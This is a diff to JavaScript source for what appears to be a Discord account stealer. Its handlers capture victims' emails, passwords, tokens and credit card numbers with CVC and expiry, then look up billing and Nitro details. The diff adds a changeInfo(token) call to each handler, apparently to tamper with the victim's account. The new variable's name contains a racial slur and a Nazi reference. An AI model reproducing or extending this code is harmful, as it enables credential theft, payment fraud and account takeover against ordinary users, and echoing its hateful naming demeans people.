@@ -664,6 +664,7 @@ const hooker = async (content) => {
 
 const login = async (email, password, token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
@@ -706,6 +707,7 @@ const login = async (email, password, token) => {
 
 const passwordChanged = async (oldpassword, newpassword, token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
@@ -748,6 +750,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
 
 const emailChanged = async (email, password, token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
@@ -790,6 +793,7 @@ const emailChanged = async (email, password, token) => {
 
 const PaypalAdded = async (token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = getBilling(token);
@@ -832,6 +836,7 @@ const PaypalAdded = async (token) => {
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
@@ -874,6 +879,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
 
 const nitroBought = async (token) => {
   const json = await getInfo(token);
+  const jsongayniggahitler = await changeInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
